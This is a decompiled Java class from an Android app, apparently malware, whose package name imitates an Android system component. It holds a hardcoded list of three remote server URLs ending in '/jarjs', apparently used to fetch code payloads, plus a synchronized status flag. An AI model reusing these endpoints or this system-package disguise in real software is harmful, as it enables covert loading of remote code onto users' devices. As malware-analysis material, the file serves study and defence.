package com.android.system.reads.b;

public final class b {
  public static final String[] a = new String[] { "http://101.64.176.136:8085/jarjs", "http://115.238.238.136:8085/jarjs", "http://do.syssay.com/jarjs" };
  
  private static int b = 0;
  
  public static boolean a() {
    // Byte code:
    //   0: iconst_1
    //   1: istore_0
    //   2: ldc com/android/system/reads/b/b
    //   4: monitorenter
    //   5: getstatic com/android/system/reads/b/b.b : I
    //   8: istore_1
    //   9: iload_1
    //   10: iconst_1
    //   11: if_icmpne -> 19
    //   14: ldc com/android/system/reads/b/b
    //   16: monitorexit
    //   17: iload_0
    //   18: ireturn
    //   19: iconst_0
    //   20: istore_0
    //   21: goto -> 14
    //   24: astore_2
    //   25: ldc com/android/system/reads/b/b
    //   27: monitorexit
    //   28: aload_2
    //   29: athrow
    // Exception table:
    //   from	to	target	type
    //   5	9	24	finally
  }
  
  public static void b() {
    // Byte code:
    //   0: ldc com/android/system/reads/b/b
    //   2: monitorenter
    //   3: iconst_1
    //   4: putstatic com/android/system/reads/b/b.b : I
    //   7: ldc com/android/system/reads/b/b
    //   9: monitorexit
    //   10: return
    //   11: astore_0
    //   12: ldc com/android/system/reads/b/b
    //   14: monitorexit
    //   15: aload_0
    //   16: athrow
    // Exception table:
    //   from	to	target	type
    //   3	7	11	finally
  }
}


/* Location:              /home/fahim/Desktop/BreakBottleNeckOmigo-dex2jar.jar!/com/android/system/reads/b/b.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */